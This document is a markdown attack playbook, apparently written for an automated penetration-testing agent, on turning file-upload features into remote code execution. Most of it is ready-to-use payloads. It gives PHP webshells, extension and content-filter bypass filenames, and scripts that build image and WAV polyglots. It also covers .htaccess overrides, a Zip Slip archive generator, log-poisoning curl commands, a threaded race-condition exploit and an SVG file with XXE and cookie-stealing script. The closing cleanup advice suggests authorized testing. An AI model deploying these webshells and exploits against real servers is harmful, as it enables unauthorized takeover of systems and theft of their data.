# File Upload to RCE

## Trigger

Load file-upload methodology when ANY of these signals appear:
- File upload forms: avatar/image upload, document/attachment upload, bulk import, CSV/XLSX import
- Rich text editors: FCKeditor, CKEditor, UEditor, KindEditor, TinyMCE (signature `editor/filemanager/` or `upload.php`)
- Archive upload + extraction: ZIP/TAR upload for themes, plugins, backups, document conversion
- Content-type switching: any endpoint that re-processes uploaded files into previews/thumbnails
- CMS-specific paths: `/wp-admin/async-upload.php`, `/admin/upload`, `/import/`, `/apply/`
- File storage paths exposed in responses: `{"url":"/uploads/..."}`, `{"path":"..."}`
- Image processing endpoints (resize, crop, filter) that take an image URL or file

## Attack Surface

- Any form accepting `multipart/form-data` with `<input type="file">`
- API endpoints with `Content-Type: multipart/form-data` where filename is user-controlled
- Archive extraction (ZIP/TAR) features for themes, plugins, backups, templates
- Image/profile photo upload with server-side processing (resize, thumbnail, watermark)
- Document processing (DOCX/PDF/TEX to PDF conversion, OCR services)
- Data import features (CSV, XML, JSON import that reads uploaded files)
- Code editors/file managers in admin panels

## Decision Tree

```
1. Probe → Upload a test file and observe response
   ├─ Extension not validated → Direct webshell upload
   ├─ Extension checked → Try bypass matrix
   │     ├─ Blacklist → double ext, special ext, case swap
   │     └─ Whitelist → null byte, parser confusion, content injection
   └─ Full validation → Look for secondary vectors
         ├─ Archive extraction (ZIP slip)
         ├─ Image processing (polyglot, EXIF injection)
         └─ Race condition (upload-then-scan window)

2. Determine server type → Choose webshell format
   ├─ .php → PHP webshell
   ├─ .asp/.aspx → ASP/ASPX webshell
   ├─ .jsp/.jspx → JSP webshell
   └─ Unknown → test all common extensions

3. Determine upload path → Access the uploaded file
   ├─ Returned in response → direct access
   ├─ Editor directory listing → browse
   └─ Timestamp-based → brute-force predictable names
```

## Techniques

### PHP Webshell (Basic)

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php file_get_contents('/flag'); ?>
<?php `$_GET[c]`; ?>
```

### Extension Bypass Matrix

```bash
# Case swapping
shell.PhP  shell.pHP  shell.ASP  shell.Asp

# Double extension
shell.php.jpg      shell.php.png
shell.jpg.php      shell.png.php

# Special PHP extensions (beyond .php)
shell.phtml  shell.php5  shell.php7
shell.phar   shell.pht   shell.phps

# ASP/IIS special extensions
shell.asa    shell.cer   shell.cdx
shell.aspx   shell.ashx

# JSP special extensions
shell.jspx   shell.jspa  shell.jspi  shell.jsw

# Space/dot tricks (Windows auto-trim)
shell.php.   shell.php.   shell.php..  shell.php... .

# NTFS Alternate Data Stream (Windows IIS)
shell.php::$DATA
shell.php::$DATA.jpg

# Null byte (PHP < 5.3.4, legacy Java)
shell.php%00.jpg

# Semicolon (IIS 6.0)
shell.asp;.jpg

# Line feed (Apache CVE-2017-15715)
shell.php\x0a.jpg

# Double-write bypass (single-pass filter)
shell.pphphp    # filter strips "php" once -> shell.php
shell.pHPhp     # case-mixed double write
```

### Image Polyglot Webshell

```bash
# GIF + PHP polyglot
printf "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.gif
mv shell.gif shell.php.gif

# PNG + PHP polyglot via EXIF
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png
mv image.png image.png.php

# JPEG + PHP polyglot
cat image.jpg shell.php > polyglot.jpg.php

# PNG palette polyglot (valid PNG + ZIP containing PHP)
cat image.png php_webshell.zip > polyglot.png.php

# BMP pixel webshell
python3 -c "
import struct
# BMP header + PHP code as pixel data
data = b'BM' + struct.pack('<I', 54) + b'\x00' * 46
data += b'<?php system(\$_GET[\"cmd\"]); ?>'
open('poly.bmp.php','wb').write(data)
"
```

### .htaccess Override

```apache
# Upload this FIRST if .htaccess is allowed
AddType application/x-httpd-php .lol
AddHandler application/x-httpd-php .abc
php_value engine 1
```

Then upload `shell.lol` or `shell.abc` with PHP content.

### Server Parse Confusion

```bash
# IIS 6.0: directory named *.asp forces all files in it as ASP
# Create directory: shell.asp/  then upload 1.jpg with ASP code

# IIS 7.5: /shell.jpg/.php forces PHP parsing
curl http://target/uploads/shell.jpg/shell.php

# Nginx + PHP-FPM: /shell.jpg/x.php triggers PHP parsing
# (requires cgi.fix_pathinfo=1)

# Apache: shell.php.xxx is parsed as PHP if xxx is unknown
# (Apache iterates extensions right-to-left)

# Tomcat PUT CVE-2017-12615:
PUT /shell.jsp/ HTTP/1.1
```

### Archive Upload (ZIP/TAR)

```bash
# ZIP containing PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip payload.zip shell.php
curl -F "file=@payload.zip" http://target/import

# Zip Slip - path traversal in archive filename
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as zf:
    zf.writestr('../../../var/www/html/shell.php',
                '<?php system(\$_GET[\"cmd\"]); ?>')
"

# ZIP with symlink (read arbitrary file)
ln -s /etc/passwd link.txt
zip --symlink evil.zip link.txt
```

### PHP Filter Chain RCE (php://filter to create arbitrary content)

```bash
# Chain multiple php://filter conversions to generate arbitrary PHP
# Use synacktiv/php-filter-chain-generator
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# Output: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=xxx
```

### Log Poisoning

```bash
# Inject PHP into Apache/Nginx access log via User-Agent
curl -A "<?php system(\$_GET['c']); ?>" http://target/index.php

# Include the log file via LFI
curl "http://target/?page=../../../../var/log/apache2/access.log&c=id"
```

### Race Condition (Upload-Then-Delete Window)

```python
import threading, requests

def upload():
    while not stop.is_set():
        requests.post("http://target/upload",
                      files={"file": ("shell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg")})
def access():
    while not stop.is_set():
        r = requests.get("http://target/uploads/shell.php?cmd=id")
        if "uid=" in r.text:
            print("[+] RCE! Response:", r.text[:200])
            stop.set()

stop = threading.Event()
for _ in range(20):
    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()
```

### WAV/Polyglot with PHP

```python
# WAV files have RIFF header + format chunk + data chunk
# PHP ignores everything before <?php, so prepend valid WAV header
import struct
samplerate = 44100
channels = 1
bits = 16
data = b'<?php system($_GET["cmd"]); ?>'
wav = b'RIFF' + struct.pack('<I', 36 + len(data)) + b'WAVE'
wav += b'fmt ' + struct.pack('<I', 16)  # chunk size
wav += struct.pack('<H', 1)             # PCM format
wav += struct.pack('<H', channels)
wav += struct.pack('<I', samplerate)
wav += struct.pack('<I', samplerate * channels * bits // 8)
wav += struct.pack('<H', channels * bits // 8)
wav += struct.pack('<H', bits)
wav += b'data' + struct.pack('<I', len(data)) + data
open('shell.wav.php', 'wb').write(wav)
```

### SVG Upload (XSS + XXE)

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
  <script>alert(document.cookie)</script>
</svg>
```

## Bypass

### WAF/Content Filter Bypass

- **Keyword filtering**: Use variable functions `$a='sys'.'tem'; $a('id');`, base64 `eval(base64_decode('...'))`, or bitwise operations
- **Short tags**: `<?=` and `<?` (short open tag) bypass filters looking for `<?php`
- **PHP magic quotes** (legacy): Already deprecated, but `$_GET[c]` (without quotes) works when quotes are filtered
- **Multiple Content-Type headers**: Send `Content-Type: image/jpeg` and `Content-Type: application/x-php` simultaneously
- **Chunked transfer**: Use `Transfer-Encoding: chunked` to split the payload across chunks

### Content Validation Bypass

- **Magic bytes**: Prepend `GIF89a`, `\x89PNG`, `\xFF\xD8\xFF` (JPEG) before PHP code
- **Double extension for nginx**: `.php` extension anywhere triggers PHP-FPM even if file looks like `.jpg`
- **Content-Disposition manipulation**: Use `filename*=UTF-8''shell.php` or add extra boundary parameters

## Verification

- Access uploaded file URL directly in browser — PHP code executes, command output visible
- For image polyglot: Download the file and verify it opens as a valid image AND executes PHP code
- For race condition: The first access wins — must catch the file before server deletes it
- For archive extraction: Access extracted webshell at expected directory traversal path

## Pitfalls

- PHP `system()` may be disabled — use `passthru()`, `shell_exec()`, `file_get_contents()`, `scandir()`, or `phpinfo()` as fallbacks
- Double extension `.php.jpg` does NOT work on all servers — Apache processes right-to-left, Nginx only cares about the last extension if PHP-FPM is configured for `\.php$`
- `.htaccess` may be blocked by Apache config (`AllowOverride None`) — test first with a minimal `.htaccess` containing `Deny from all`
- Image polyglot files may be re-encoded (resized, stripped EXIF) by the server, breaking the PHP payload
- Null byte `%00` only works on PHP < 5.3.4 and legacy Java — modern PHP ignores the null byte
- Windows IIS removes trailing dots/spaces from filenames automatically — use this to bypass extension checks
- After upload, the server might rename the file with a hash or timestamp — you need to predict or discover the final path
- Always clean up PoC webshells after testing and document the file path for the recipient
